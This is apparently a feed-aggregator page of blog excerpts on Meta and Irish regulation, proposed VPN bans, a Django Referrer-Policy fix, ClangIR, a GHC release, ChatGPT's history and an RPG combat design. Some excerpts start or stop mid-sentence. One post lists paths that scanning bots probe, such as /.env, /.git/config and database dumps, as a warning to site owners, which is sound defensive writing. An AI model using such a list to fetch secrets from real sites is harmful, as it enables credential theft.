about Meta or Careless People, Wynn-Williams would fall silent and assume a blank facial expression, lest she make another statement that would result in Meta seeking another $50,000 from her under the terms of her contract. In their complaint to the EU, ICCL raises the extremely likely probability that Sweeney is bound by the same contractual terms as Wynn-Williams, meaning that Meta's top regulator in Ireland, the country where Meta pretends to be based, will be contractually prohibited from saying anything that makes Mark Zuckerberg feel bad about himself. This isn't just a matter for Ireland, either. Given the nature of European federalism, most of Meta's violations of European privacy laws will start with the Irish DPC – in other words, all 500,000,000 Europeans will be forced to complain to someone who is legally barred from upsetting Zuck's digestion. Tax havens are a global scourge. By allowing American tech companies to evade their taxes around the world, Ireland is complicit in starving countries everywhere of tax revenue they are properly owed. Perhaps even worse than this, though, is the fact that these cod-Irish American companies can always out-compete their domestic rivals all over the world, because those companies have to pay tax, while Meta does not. Ireland has been every bit as important in exporting US Big Tech around the world as the US has been. But Ireland has another key export, one that is confined to the European Union. Because every tax haven must be a crime haven, and because Big Tech's favorite crime is illegal surveillance, Ireland has exported American tech spying to the whole European Union. That's how things stand today, and how they've stood since the passage of the GDPR. If you'd asked me a year ago, I would have said that this is as terrible as things could get. But now that Ireland has put an ex-Meta exec in charge of deciding whether Meta is invading Europeans' privacy, without confirming whether this dingo babysitter is even allowed to criticize Meta, it's clear that things could get much worse than I ever imagined.

It's way past time. (I hope.) It's also possible we're in the process of inventing <a href="https://daytona.scripting.com/search?q=%22the%20matrix%22">The Matrix</a>. Ooops.

<p>The problem is that Live Text, “Select text in images to copy or take action,” is enabled by default on iOS devices (Settings → General → Language &amp; Region), which can interfere with the contextual menu in Safari.

      <h1>Banning VPNs</h1>

(date: 2025-12-01)
      <p>
      <p>This is crazy. Lawmakers in several US states are contemplating <a href="https://www.eff.org/deeplinks/2025/11/lawmakers-want-ban-vpns-and-they-have-no-idea-what-theyre-doing">banning VPNs</a>, because…think of the children!</p>
<blockquote>
<p>As of this writing, Wisconsin lawmakers are escalating their war on privacy by targeting VPNs in the name of “protecting children” in <a href="https://docs.legis.wisconsin.gov/2025/proposals/reg/asm/bill/AB105">A.B. 105</a>/ <a href="https://docs.legis.wisconsin.gov/2025/proposals/sb130">S.B. 130</a>. It’s an age verification bill that requires all websites distributing material that could conceivably be deemed “sexual content” to both implement an age verification system and also to block the access of users connected via VPN. The bill seeks to broadly expand the definition of materials that are “harmful to minors” beyond the type of speech that states can prohibit minors from accessing­ potentially encompassing things like depictions and discussions of human anatomy, sexuality, and reproduction...</p>

      <h1>YouTube embeds fail with a 153 error</h1>

(date: 2025-12-01)
      <p>
      <p><strong><a href="https://github.com/simonw/simonwillisonblog/issues/561">YouTube embeds fail with a 153 error</a></strong></p>
<p>I just fixed this bug on my blog. I was getting an annoying &quot;Error 153: Video player configuration error&quot; on some of the YouTube video embeds (like <a href="https://simonwillison.net/2024/Jun/21/search-based-rag/">this one</a>) on this site. After some digging it turns out the culprit was this HTTP header, which Django's SecurityMiddleware was <a href="https://docs.djangoproject.com/en/5.2/ref/middleware/#module-django.middleware.security">sending by default</a>:</p>
<pre><code>Referrer-Policy: same-origin

</code></pre>
<p>YouTube's <a href="https://developers.google.com/youtube/terms/required-minimum-functionality#embedded-player-api-client-identity">embedded player terms documentation</a> explains why this broke:</p>
<blockquote>
<p>API Clients that use the YouTube embedded player (including the YouTube IFrame Player API) must provide identification through the <code>HTTP Referer</code> request header. In some environments, the browser will automatically set <code>HTTP Referer</code>, and API Clients need only ensure they are not setting the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy"><code>Referrer-Policy</code></a> in a way that suppresses the <code>Referer</code> value. YouTube recommends using <code>strict-origin-when-cross-origin</code> Referrer-Policy, which is already the default in many browsers.</p>
</blockquote>
<p>The fix, which I <a href="https://github.com/simonw/simonwillisonblog/pull/562">outsourced to GitHub Copilot agent</a> since I was on my phone, was to add this to my <code>settings.py</code>:</p>
<pre><code>SECURE_REFERRER_POLICY = &quot;strict-origin-when-cross-origin&quot;

</code></pre>
<p>This <a href="https://developer.chrome.com/blog/referrer-policy-new-chrome-default">explainer on the Chrome blog</a> describes what the header means:</p>
<blockquote>
<p><code>strict-origin-when-cross-origin</code> offers more privacy. With this policy, only the origin is sent in the Referer header of cross-origin requests.</p>
<p>This prevents leaks of private data that may be accessible from other parts of the full URL such as the path and query string.</p>
</blockquote>
<p>Effectively it means that any time you follow a link from my site to somewhere else they'll see this in the incoming HTTP headers even if you followed the link from a page other than my homepage:</p>
<pre><code>Referer: https://simonwillison.net/

</code></pre>
<p>The previous header, <code>same-origin</code>, is <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy">explained by MDN here</a>:</p>
<blockquote>
<p>Send the <a href="https://developer.mozilla.org/en-US/docs/Glossary/Origin">origin</a>, path, and query string for <a href="https://developer.mozilla.org/en-US/docs/Glossary/Same-origin_policy">same-origin</a> requests. Don't send the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer"><code>Referer</code></a> header for cross-origin requests.</p>
</blockquote>
<p>This meant that previously traffic from my site wasn't sending any HTTP referer at all!</p>

      <h1>GSoC 2025: ClangIR upstreaming</h1>

(date: 2025-12-01)
      <p>
      <p>Hello everyone 👋! My name is Amr Hesham, and for Google Summer of Code 2025, I’ve been working on the ClangIR Upstreaming project.</p>
<p>My mentors were Bruno Cardoso Lopes, Andy Kaylor and Erich Keane.</p>
<h1>Background</h1>
<p>ClangIR is a high-level representation in Clang that reflects aspects of the C/C++ languages and their extensions. It is implemented using MLIR and occupies a position between Clang’s AST and LLVM IR.</p>
<p>Starting from April 2024, the upstreaming process started to migrate the code from the <a href="https://github.com/llvm/clangir">incubator</a> to the <a href="https://github.com/llvm/llvm-project">main</a> LLVM repository.</p>
<p>The ClangIR upstreaming process includes the following steps:</p>
<ul>
<li>Improve the design of ClangIR dialect operations, attributes, syntax and implementation details if needed.</li>
<li>Align with LLVM coding standards and quality expectations.</li>
<li>Implement missing features in the incubator and upstream it.</li>
<li>Backport the new design/implementation from the LLVM repository to the incubator.</li>
<li>Implement folders for ClangIR dialect operations.</li>
</ul>
<p>The goal of this project was to implement the following C/C++ features in the ClangIR project.</p>
<ul>
<li>
<p>Built-in VectorType ( <code>vector_size</code> and <code>ext_vector_type</code> attributes) with operators and built-ins functions.</p>
</li>
<li>
<p>ComplexType with operators and all <code>-complex-range</code> flag values to allow selecting different arithmatic calculation algorithms, for example, the SMITH, R. L. Algorithm 116: Complex division. Commun. ACM 5, 8 (1962).</p>
</li>
<li>
<p>C++ Exception handling.</p>
</li>
</ul>
<h1>What we did</h1>
<p>Over the coding period, I did the following.</p>
<h2>Builtin VectorType</h2>
<p>I have implemented support for all C/C++ operators for built-in VectorType that includes arithmetic, comparison, shifts and logical operators, also supporting using VectorType in many expressions, for example, index and ternary expression, and now we can compile C++ code successfully.</p>
<p>Also, implemented folders for ClangIR VectorType operations to fold specific patterns. For example, in cir::VecExtractOp, if both the vector and the index are constant, we can fold that operation and replace it with the actual result.</p>
<pre><code>// Before%vector = cir.const #cir.const_vector&lt;[#cir.int&lt;1&gt; : !s32i, #cir.int&lt;2&gt; : !s32i, #cir.int&lt;3&gt; : !s32i, #cir.int&lt;4&gt; : !s32i]&gt; : !cir.vector&lt;4 x !s32i&gt;%index = cir.const #cir.int&lt;1&gt; : !s32i%element = cir.vec.extract %vector[%index : !s32i] : !cir.vector&lt;4 x !s32i&gt;// After%element = cir.const #cir.int&lt;2&gt; : !s32i
</code></pre>
<p>I also implemented folders for other operators, for example, Shuffle, DynamicShuffle, Comparisons…etc.</p>
<h2>ComplexType</h2>
<p>Guided by my mentors, I changed the design of the complex operations in ClangIR dialect to introduce a single operator for each arithmetic operator, like ComplexAddOp, ComplexMulOp…etc, which makes it easy to read in IR and to apply folders.</p>
<p>Also, to represent <code>__real__</code> and <code>__imag__</code> unary operators as MLIR operations not only when applying them on Complex but also on scalar values, for example.</p>
<pre><code>%real = cir.complex.real %complex : !cir.complex&lt;!s32i&gt; -&gt; !s32i;%real = cir.complex.real %scalar : !cir.float -&gt; !cir.float
</code></pre>
<p>During writing tests to cover all cases for complex types with type promotions, I found an unhandled case in the classic Clang codegen (The default Clang code generator clang/lib/CodeGen), which led to a crash with valid code, and I fixed it 🥳 (Fix will be available in clang-22).</p>
<p>Also, all <code>-complex-range</code> flag values to allow selecting different arithmatic calculation algorithms are fully implemented, for example, to use the <code>SMITH, R. L. Algorithm 116: Complex division. Commun. ACM 5, 8 (1962)</code>.</p>
<pre><code>%result = cir.complex.mul %a, %b range(basic) : !cir.complex&lt;!cir.float&gt;%result = cir.complex.mul %a, %b range(improved) : !cir.complex&lt;!cir.float&gt;%result = cir.complex.mul %a, %b range(promoted) : !cir.complex&lt;!cir.float&gt;
</code></pre>
<p>With that representation that abstracts the actual calculations of the complex multiplications at that stage, it’s easy to write a folder that, in the case of the element type of complex, is integer and one of the operands is <code>{0, 0}</code>, then we can fold the ComplexMulOp to just complex with 0 as real and imaginary values 🤓.</p>
<p>Also implemented support for using ComplexType with all C/C++ expressions except expressions related to OpenMP or Coroutine because they are not fully implemented, and implemented floating-point operators for built-in functions, for example, <code>acos</code>, <code>asign</code>, <code>atan</code>…etc, which are required to implement future built-in functions for ComplexType.</p>
<p>And implemented some not yet implemented features for Aggregate and Constant expressions to allow using more features in the language, and also to make it easy to test other expressions, either for Complex, Vector types or exceptions.</p>
<h2>Exception Handling</h2>
<p>Guided by my mentors, I changed the design of the try-catch operation in the ClangIR dialect to be like</p>
<pre><code>cir.try { ... cir.yield} catch [type #cir.global_view&lt;RTTI&gt; : !cir.ptr&lt;!u8i&gt;] { ... cir.yield} unwind { // Can be another catch, unwind, cleanup or catch all too ... cir.yield}
</code></pre>
<p>Also, I implemented support for rethrow and throw with sub-expression, for example, <code>throw _builtin_complex(1.0f, 2.0f)</code>.</p>
<p>Now we can compile C++ code with a try catch block that contains a function call, which may or may not throw exceptions.</p>
<h1>Future work</h1>
<ul>
<li>
<p>Support Implicit conversion from integral to boolean vectors, which is a new feature recentlyimplemented in the classic Clang CodeGen ( <a href="https://github.com/llvm/llvm-project/pull/158369">PR in Clang</a>).</p>
</li>
<li>
<p>Some ComplexType built-in functions should be implemented later once the call convention is upstreamed, for example, <code>__builtin_cabs</code>, <code>__builtin_ccos</code>, …etc.</p>
</li>
<li>
<p>Support a mix of unwind and cleanup regions in exception handling, so after that, when compiling the following C++ code.</p>
</li>
</ul>
<pre><code class="language-cpp">try { S1 s1; S2 s2; foo(); S3 s3;}catch (std::exception&amp; e) {}
</code></pre>
<p>We will have IR representation like this 😋.</p>
<pre><code>cir.try { cir.call @S1::S1() cir.call @S2::S2() cleanup(&quot;c1&quot;) cir.call @foo() cleanup(&quot;c1&quot;) cir.call @S3::S3() cleanup(&quot;c2&quot;) cir.call @S3::~S3() cir.call @S2::~S2() cir.call @S1::~S1() cir.yield} cleanup(&quot;c2&quot;) { cir.call @S2::~S2() // Falls through to &quot;c1&quot; cir.yield } cleanup(&quot;c1&quot;) { cir.call @S1::~S1() // Yields to the catch handler or unwind cir.yield } catch [type #cir.global_view&lt;RTTI&gt;] { // Stays in this function cir.yield } unwind { // Continues looking for a catch handler in the caller's scope cir.resume }
</code></pre>
<h1>What I’ve learned</h1>
<ul>
<li>
<p>Before Google Summer of Code, I had no experience with MLIR at all, but during the coding period, it was an incredible learning experience for me to work with my mentors on a codegen for an interesting language like C++ using MLIR.</p>
</li>
<li>
<p>Reading ClangIR Codegen in the incubator, classic Clang codegen and upstreamed Codegen was a very interesting and knowledgeable experience for me.</p>
</li>
<li>
<p>I was impressed by my knowledge near the end of Google Summer of Code when I found a crash in the original Clang codegen, and in almost one hour, I was able to find the exact reason for the crash and create a PR to fix it ( <a href="https://github.com/llvm/llvm-project/issues/160583">#160583</a>).</p>
</li>
<li>
<p>I learned a lot about best practices on how to work with MLIR.</p>
</li>
<li>
<p>I learned a lot about how to think and organize work from the upstreaming process itself and how my mentors organized it.</p>
</li>
</ul>
<h1>Acknowledgements</h1>

      <h1>GHC 9.14.1-rc3 is now available</h1>

(date: 2025-12-01)
      <p>
      <h1>GHC 9.14.1-rc3 is now available</h1>
<h4>zubin - 2025-12-01</h4>
<p>The GHC developers are very pleased to announce the availability of the
third release candidate of GHC 9.14.1. Binary distributions, source
distributions, and documentation are available at <a href="https://downloads.haskell.org/ghc/9.14.1-rc3">downloads.haskell.org</a>.</p>
<p>The changes from the second release candidate are:</p>
<ul>
<li>Fix RTS segfaults in certain situations ( <a href="https://gitlab.haskell.org/ghc/ghc/issues/26495">#26495</a>)</li>
<li>Fix use after free on windows due to a linker optimisation introduced in an earlier RC ( <a href="https://gitlab.haskell.org/ghc/ghc/issues/26613">#26613</a>)</li>
</ul>
<p>GHC 9.14 will bring a number of new features and improvements, including:</p>
<ul>
<li>
<p>Significant improvements in specialisation:</p>
<ul>
<li>The <code>SPECIALISE</code> pragma now allows use of type application syntax</li>
<li>The <code>SPECIALISE</code> pragma can be used to specialise for expression arguments
as well as type arguments.</li>
<li>Specialisation is now considerably more reliable in the presence of<code>newtype</code> s</li>
</ul>
</li>
<li>
<p>Significant GHCi improvements including:</p>
<ul>
<li>Correctness and performance improvements in the bytecode interpreter</li>
<li>Features in the GHCi debugger</li>
<li>Support for multiple home units in GHCi</li>
</ul>
</li>
<li>
<p>Implementation of the <a href="https://github.com/ghc-proposals/ghc-proposals/blob/master/proposals/0682-explicit-level-imports.rst">Explicit Level Imports proposal</a></p>
</li>
<li>
<p><code>RequiredTypeArguments</code> can now be used in more contexts</p>
</li>
<li>
<p>SSE/AVX2 support in the x86 native code generator backend</p>
</li>
<li>
<p>A major update of the Windows toolchain and improved compatibility with
macOS Tahoe</p>
</li>
<li>
<p>… and many more</p>
</li>
</ul>
<p>A full accounting of changes can be found in the <a href="https://downloads.haskell.org/ghc/9.14.1-rc3/docs/users_guide/9.14.1-notes.html">release notes</a>. Given the
many specialisation improvements and their potential for regression, we would
very much appreciate testing and performance characterisation on downstream
workloads.</p>
<p>Note that while this release makes many improvements in the specialisation
optimisation, polymorphic specialisation will remain disabled by default in the
final release due to concern over regressions of the sort identified in<a href="https://gitlab.haskell.org/ghc/ghc/-/issues/26329">#26329</a>. Users needing more aggressive specialisation can explicitly
enable this feature with the <code>-fpolymorphic-specialisation</code> flag. Depending
upon our experience with 9.14.1, we may enable this feature by default in a
later minor release.</p>

(date: 2025-11-30)
      <p>
      <p>It's ChatGPT's third birthday today.</p>
<p>It's fun looking back at Sam Altman's <a href="https://twitter.com/sama/status/1598038818472759297">low key announcement thread</a> from November 30th 2022:</p>
<blockquote>
<p>today we launched ChatGPT. try talking with it here:</p>
<p><a href="https://chat.openai.com/">chat.openai.com</a></p>
<p>language interfaces are going to be a big deal, i think. talk to the computer (voice or text) and get what you want, for increasingly complex definitions of &quot;want&quot;!</p>
<p>this is an early demo of what's possible (still a lot of limitations--it's very much a research release). [...]</p>
</blockquote>
<p>We later learned <a href="https://www.forbes.com/sites/kenrickcai/2023/02/02/things-you-didnt-know-chatgpt-stable-diffusion-generative-ai/">from Forbes in February 2023</a> that OpenAI nearly didn't release it at all:</p>
<blockquote>
<p>Despite its viral success, ChatGPT did not impress employees inside OpenAI. “None of us were that enamored by it,” Brockman told Forbes. “None of us were like, ‘This is really useful.’” This past fall, Altman and company decided to shelve the chatbot to concentrate on domain-focused alternatives instead. But in November, after those alternatives failed to catch on internally—and as tools like Stable Diffusion caused the AI ecosystem to explode—OpenAI reversed course.</p>
</blockquote>
<p>MIT Technology Review's March 3rd 2023 story <a href="https://www.technologyreview.com/2023/03/03/1069311/inside-story-oral-history-how-chatgpt-built-openai/">The inside story of how ChatGPT was built from the people who made it</a> provides an interesting oral history of those first few months:</p>
<blockquote>
<p><strong>Jan Leike</strong>: It’s been overwhelming, honestly. We’ve been surprised, and we’ve been trying to catch up.</p>
<p><strong>John Schulman</strong>: I was checking Twitter a lot in the days after release, and there was this crazy period where the feed was filling up with ChatGPT screenshots. I expected it to be intuitive for people, and I expected it to gain a following, but I didn’t expect it to reach this level of mainstream popularity.</p>
<p><strong>Sandhini Agarwal</strong>: I think it was definitely a surprise for all of us how much people began using it. We work on these models so much, we forget how surprising they can be for the outside world sometimes.</p>
</blockquote>
<p>It's since <a href="https://www.wbur.org/onpoint/2025/06/25/sam-altman-openai-keach-hagey">been described</a> as one of the most successful consumer software launches of all time, signing up a million users in the first five days and <a href="https://techcrunch.com/2025/10/06/sam-altman-says-chatgpt-has-hit-800m-weekly-active-users/">reaching 800 million monthly users</a> by November 2025, three years after that initial low-key launch.</p>

      <h1>Malicious Traffic and Static Sites</h1>

(date: 2025-11-30)
      <p>
      <p>I wrote about <a href="https://blog.jim-nielsen.com/2025/top-resource-not-found/">the 404s I serve for robots.txt</a>. Now it’s time to look at some of the other common 404s I serve across my static sites (as reported by Netlify’s analytics):</p>
<ul>
<li><code>/wp-login.php</code></li>
<li><code>/wp-admin</code></li>
<li><code>/news/wp-includes/wlwmanifest.xml</code></li>
<li><code>/login/</code></li>
<li><code>/wp-includes/wlwmanifest.xml</code></li>
<li><code>/news/wp-includes/wlwmanifest.xml</code></li>
<li><code>/website/wp-includes/wlwmanifest.xml</code></li>
<li><code>/info.php</code></li>
</ul>
<p>I don’t run WordPress, but as you can see I still get a lot of requests for <code>wp-*</code> resources.</p>
<p>All of my websites are basically just static files on disk, meaning only GET requests are handled (no POST, PUT, PATCH, etc.). And there’s no authentication anywhere.</p>
<p>So when I see these requests, I think: “Sure is nice to have a static site where I don’t have to worry about server maintenance and security patches for all those resources.”</p>
<p>Of course, that doesn’t mean running a static site protects me from being exploited by malicious, vulnerability-seeking traffic.</p>
<p>Here are a few more common requests I’m serving a 404 to:</p>
<ul>
<li><code>/.env</code></li>
<li><code>/.env.production</code></li>
<li><code>/.env.local</code></li>
<li><code>/.env.dev</code></li>
<li><code>/.git/config</code></li>
<li><code>/data.sql</code></li>
<li><code>/database.sql.gz</code></li>
<li><code>/mysql.sql</code></li>
<li><code>/db.sql.gz</code></li>
<li><code>/backup.sql.gz</code></li>
<li><code>/database.sql</code></li>
</ul>
<p>With all the magic building and bundling we do as an industry, I can see how easy it would be to have some sensitive data in your source repo (like the ones above) end up in your build output. No wonder there are bots scanning the web for these common files!</p>
<p>So be careful out there. Just because you’ve got a static site doesn’t mean you’ve got no security concerns. Fewer, perhaps, but not none.</p>

      <h1>2025-11-30 Stealth ships in Kinetic Energy</h1>

(date: 2025-11-30)
      <p>
      <h1>2025-11-30 Stealth ships in Kinetic Energy</h1>
<p>Regarding <a href="Kinetic_Energy">Kinetic Energy</a> and space combat, I had
decided early on that I didn’t want the lasers and sandcasters from
Classic Traveller nor the missiles from Macross. The lasers seemed not
to work all the well in or reality, sand seemed way to heavy, and
missiles … I just kept wondering how they would work.</p>
<p>It didn’t take long, though, and <a href="https://mastorol.es/@eldadoinquieto" title="@eldadoinquieto@mastorol.es">@eldadoinquieto</a> asked me
about missiles and self-propelled projectiles. That made me think
about the situation some more.</p>
<p>The first argument against missiles I has was about payload and
delivery. Missiles can’t correct their path all that much unless they
are slow. And if they are fast, then something that’s even faster and
works with kinetic energy is going to be better than something that
needs thrusters for course correction and explosives.</p>
<p>The second argument I had was about the kind of game I wanted run.
It’s not obvious to me that having torpedos makes the game more
interesting. Unless there’s a need for a kind of U-Boot mini-game. But
that’s not how I see ship combat going.</p>
<p><a href="https://appdot.net/@mdhughes" title="@mdhughes@appdot.net">@mdhughes</a> argued that the railgun could shoot torpedoes and
then the torpedo can course-correct. After all, the space ship drives
are already breaking the laws of physics. It really all comes down to
the size of these implausible engines.</p>
<p>Current rail-guns get muzzle velocities of 12Mm/s (12,000 km/s). Does
the torpedo need to hit the target? A question<a href="https://mastodon.gamedev.place/@yora" title="@yora@mastodon.gamedev.place">@yora</a> raised was this: If it needs to detonate
something, how likely is it to detonate “near enough” to the target if
it is travelling at these speeds?</p>
<p>These high velocities are also what makes me think that a tiny
thruster onboard the projectile cannot course-correct significantly
compared to that muzzle velocity.</p>
<p>Without a gas, there is no “explosions” in space (no pressure wave to
damage a nearby target) so a warhead would have to deliver shrapnel,
like a grenade, or deadly radiation (that decays rapidly as the
distance increases). <a href="https://spacey.space/@nyrath" title="@nyrath@spacey.space">@nyrath</a> has an article on the
Project Rho site,<a href="https://www.projectrho.com/public_html/rocket/spacegunconvent.php">Nukes In Space</a>.</p>
<p>And now I wonder whether I’d like a game where radiation poisoning is
common. Perhaps it’s easier to postulate that spacesuits safeguard
humans from radiation, rendering nuclear weapons in space ineffective
or at least inefficient compared to rail-guns.</p>
<p>Is shrapnel the way to go? Sacrifice some mass, reducing kinetic
energy, add a little warhead that just fragments the mass, producing
shrapnel? If a single fragment was still deadly, then the rail-gun
could also scale down or shoot every piece individually. Without drag,
there is little point in shooting a grenade, I think. Turn the
rail-gun into a rail-shotgun. Or increase the frequency and improve
the aim. All these scenarios seem to be things I don’t want to model
because they don’t lead to interesting decisions at the table. An
abstract “rail-guns are the only weapon that can harm spaceships” is
good enough.</p>
<p>So perhaps now it’s time to consider the alternative: Stealth ships
trying to sneak up to slow-moving or stationary targets in order to
deliver “bombs” or torpedoes. Would such a stealth ship run into
mines, as suggested by <a href="https://mastorol.es/@eldadoinquieto" title="@eldadoinquieto@mastorol.es">@eldadoinquieto</a>?</p>
<p>I am sceptical. If the approach to a hideout is “mined” – what happens
in the game? Mines seem like something one would have to introduce
because it allows some specific game experience. Perhaps the only
thing we really need is for large stationary objects like stations to
have the means to disable ships near the docking bays. Then call it
autonomous mines with thrusters or something like that. Or torpedoes
launched by a stealth ship.</p>
<p><a href="https://spacey.space/@isaackuo" title="@isaackuo@spacey.space">@isaackuo</a> suggested stealth ships and torpedoes running
with liquid hydrogen cooling and noted that YouTube is full of videos
about sub warfare.</p>
<p>How would this end up playing out in Kinetic Energy? Jump into a
system, accelerate towards the target, switch on cooling. This gives
you the chance at one bombing run. The enemy knows you have arrived
but doesn’t know when exactly you’ll fire the torpedoes since the
exact vector remains unknown. Alternatively, your ship is lying in
ambush near a station. You know the mark needs to pass through here.
When it arrives, switch on cooling. They don’t know what’s coming.</p>
<p>Cooling limits the number of stealth rounds. For gaming purposes,
let’s say you get three rounds. Roll Education + Pilot once per
stealth round to continue the approach and get the Gunner a cumulative
+1 bonus. If you fail, you are discovered.</p>
<p>If you are discovered early, the target can deploy countermeasures to
foil the torpedoes. Use Education + Pilot to escape if mobile, use
Intelligence + Gunnery if immobile and armed with smaller guns to
shoot down torpedoes.</p>
<p>Of course, if you are discovered early, the target can also use their
firepower to target the stealth ship as it tries to get away.</p>
<p>As for the trade-off: four torpedoes per turret, one cooling turret per
stealth round (up to three).</p>
<p>A medium attack boat would have a Martial Mass of 8: 1 + three cooling
turrets (max) + three torpedo turrets (12 torpedoes) + 1 rail-gun.
Rolling 8d6 for both Integrity and Stability I get 28/29. The pilot
has Education-8 and Pilot-2; the three torpedo gunners have
Intelligence-8 and Gunnery-2. Checking for stealth approach: 10 … 7
… 6. Success. The Gunnery bonus is +3 therefore the torpedoes cannot
miss unless there is an additional defence, therefore the gunners
don’t need to roll. All 12 torpedoes hit the target, dealing 12d6
damage to Integrity and Stability on the first round. The attack boat
is out of torpedoes but there’s still the rail-gun. That one doesn’t
get a bonus due to the proximity so a regular 1d6 ≤ 8 + 2 is required.
Rolled a 7 and scored another hit for 1d6 damage.</p>
<p>I’m still not sure whether I like this. A Tactics skill check to fire
back at the stealth ship and torpedoes in the last round? Or just
accept this? Or allow the firing of just one torpedo per turret and
round, so this attack boat can fire just three torpedoes the first
round? Or is it fair that the stealth ship can take down a bigger
ship. And what about the next encounter? The attack ship is a sitting
duck: It has just a single rail-gun and it takes 8 rounds to get to
escape velocity.</p>

The <a href="http://scripting.com/2025/11/29/165203.html">issue</a> I posted about yesterday turns out to be a bug, and apparently it's going to be fixed.

Usually with most vendors if there's a bug, they don't acknowledge, and then they might get around to looking at it someday. This is what I call <a href="https://daytona.scripting.com/search?q=%22working%20together%22">working together</a>.

This stuff feels like time travel, and it's also incredibly reassuring to find that solutions to issues that were relevant 14 years ago are still relevant today. That's the stability that platforms require in order for developers to build with confidence. This is something that many big tech companies (cough Apple cough) either don't understand or don't care about.</p>

      <p>These are some things I’ve wandered across on the web this week.</p>
<h2>🔖 <a href="https://feed.lovergne.dev/">tinyfeed</a></h2>
<p>tinyfeed is a CLI tool that generate a static HTML page from a
collection of feeds.</p>
<p>It’s dead simple, no database, no config file, just a CLI and some HTML</p>
<p>Give it a list of RSS, Atom or JSON feeds urls and it will generate a
single HTML page for it. Then you can effortlessly set it up in crond,
systemd or openrc and voilà, you’ve got yourself a webpage that
aggregates your favorite feeds.</p>
<h2>🔖 <a href="https://surfingcomplexity.blog/2025/11/26/brief-thoughts-on-the-recent-cloudflare-outage/">Brief thoughts on the recent Cloudflare outage</a></h2>
<p>What impressed me the most about this writeup is that they documented
some aspects of what it was like responding to this incident: what they
were seeing, and how they tried to made sense of it.</p>
<h2>🔖 <a href="https://www.iankduncan.com/engineering/2025-11-27-crdt-dictionary">The CRDT Dictionary: A Field Guide to Conflict-Free Replicated DataTypes</a></h2>
<p>This guide will hopefully cut through that. We’ll build intuition
through interactive demos and concrete examples. You’ll see how merges
actually work, watch conflicts resolve (or not resolve), and develop a
feel for which CRDT fits which problem.</p>
<h2>🔖 <a href="https://www.structural-integrity.eu/crashing-hard-why-talking-about-bubbles-obscures-the-real-social-cost-of-overinvesting-into-artificial-intelligence/">Crashing hard: why talking about bubbles obscures the real social costof overinvesting into “Artificial Intelligence”</a></h2>
<p>More and more commentators talk about and warn of an “AI bubble”, and
everybody seems to congratulate each other on being such a smart
financial analyst. BUT: A bubble pops and you are left with air and
maybe a splash of soap somewhere on the floor. A fairly clean affair.
This kind of investor speak obscures the severe consequences economic
crashes cause, coming from someone’s point of view for whom this is more
likely to be a spectacle than a direct threat…</p>
<p>In this article, I want to illustrate the broad range of costs that BOTH
the buildup of “AI” overvaluations AND their coming down will have. The
current “AI” investments will have long-term costs by creating
significant path dependencies: They make harmful things cheaper, speed
up the commodification of human labour and shift social norms.</p>
<h2>🔖 <a href="https://commoncrawl.org/blog/setting-the-record-straight-common-crawls-commitment-to-transparency-fair-use-and-the-public-good">Setting the Record Straight: Common Crawl’s Commitment to Transparency,Fair Use, and the Public Good</a></h2>
<p>A recent article in The Atlantic (“The Nonprofit Doing the AI Industry’s
Dirty Work,” November 4, 2025) makes several false and misleading claims
about the Common Crawl Foundation, including the accusation that our
organization has “lied to publishers” about our activities.</p>
<p>This allegation is untrue. It misrepresents both how Common Crawl
operates and the values that guide our work.</p>
<h2>🔖 <a href="https://www.theatlantic.com/technology/2025/11/common-crawl-ai-training-data/684567/">The Company Quietly Funneling Paywalled Articles to AI Developers</a></h2>
<p>Common Crawl doesn’t log in to the websites it scrapes, but its scraper
is immune to some of the paywall mechanisms used by news publishers. For
example, on many news websites, you can briefly see the full text of any
article before your web browser executes the paywall code that checks
whether you’re a subscriber and hides the content if you’re not. Common
Crawl’s scraper never executes that code, so it gets the full articles.
Thus, by my estimate, the foundation’s archives contain millions of
articles from news organizations around the world, including The
Economist, the Los Angeles Times, The Wall Street Journal, The New York
Times, The New Yorker, Harper’s, and The Atlantic.</p>
<h2>🔖 <a href="https://www.sciencedirect.com/science/article/abs/pii/S0959652617304213">The Matrix of Convivial Technology – Assessing technologies for degrowth</a></h2>
<p>This article introduces the notion of convivial technology as a
conceptual framework for technologies suitable for degrowth societies.
This paper is inspired by Ivan Illich’s notion of convivial tools but
reconsiders it in the light of current practices and discussions.
Looking for a definition of convivial technologies it uses qualitative
empirical research conducted with degrowth-oriented groups developing or
adapting grassroots technologies like Open Source cargo bikes or
composting toilets in Germany. The basic ethical values and design
criteria that guide these different groups in relation to technology are
summed up into five dimensions: relatedness, adaptability,
accessibility, bio-interaction and appropriateness. These dimensions can
be correlated with the four life-cycle levels material, production, use
and infrastructure to form the Matrix for Convivial Technology (MCT).
The MCT is a 20-field schema that can be filled in. Experiences with the
tool in different fields are presented. The MCT is itself a convivial
tool as it allows for degrowth-oriented groups to self-assess their work
and products in a qualitative, context-sensitive and independent way. It
is a normative schema that fosters discussion concerning degrowth
technologies in contexts of political education. And it is a research
method as it helps collecting data about underlying ethical assumptions
and aspirations of individuals and groups engaged in developing
technology.</p>

<p>We programmers are currently living through the devaluation of our
craft, in a way and rate we never anticipated possible. A fate that
designers, writers, translators, tailors or book-binders lived through
before us. Not that their craft would die out, but it would be mutilated
— condemned to the grueling task of cleaning up what the machines messed
up. Unsurprisingly, some of us are not handling the new realities well.</p>

<p>Chimera is a general-purpose Linux-based OS born from unhappiness with
the status quo. We aim to create a system that is simple, transparent,

<p>It is built from scratch using novel tooling, approaches, and userland.
Instead of intentionally limiting ourselves, we strive to achieve both
conceptual simplicity and convenience with careful and high quality
software design.</p>

<h2>🔖 <a href="https://checkeagle.com/checklists/njr/a-month-of-chat-oriented-programming/">A Month of Chat-Oriented Programming</a></h2>
<p>TL;DR: I spent a solid month “pair programming” with Claude Code, trying
to suspend disbelief and adopt a this-will-be-productive mindset. More
specifically, I got Claude to write well over 99% of the code produced
during the month. I found the experience infuriating, unpleasant, and
stressful before even worrying about its energy impact. Ideally, I would
prefer not to do it again for at least a year or two. The only problem
with that is that it “worked”. It’s hard to know exactly how well, but I
(“we”) definitely produced far more than I would have been able to do
unassisted, probably at higher quality, and with a fair number of pretty
good tests (about 1500). Against my expectation going in, I have changed
my mind. I now believe chat-oriented programming (“CHOP”) can work
today, if your tolerance for pain is high enough</p>

<p>Chiu also points out that while job listings for writers, artists, and
creatives have declined, listings for creative directors have grown.
This is precisely what you would expect to see as management embraced
